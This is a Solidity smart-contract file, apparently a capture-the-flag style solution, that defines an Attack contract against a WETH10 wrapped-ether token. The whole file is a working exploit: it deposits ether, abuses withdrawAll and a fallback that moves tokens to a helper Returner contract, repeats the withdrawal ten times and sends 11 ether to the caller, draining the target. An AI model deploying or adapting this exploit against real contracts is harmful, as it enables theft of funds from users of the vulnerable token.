// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WETH10.sol";
import "./Returner.sol";

contract Attack
{
    WETH10 target;
    Returner returner;
    constructor(address payable _target)
    {
        target = WETH10(_target);
        returner = new Returner(_target);
    }

    function attack() payable external
    {
        target.deposit{value: msg.value}();
        target.withdrawAll();

        for (int i = 0; i < 10; i++)
        {
            returner.returnTokens();
            target.withdrawAll();
        }

        (msg.sender).call{value: 11 ether}("");
    }

    fallback() external payable
    {
        target.transfer(address(returner), target.balanceOf(address(this)));
    }
}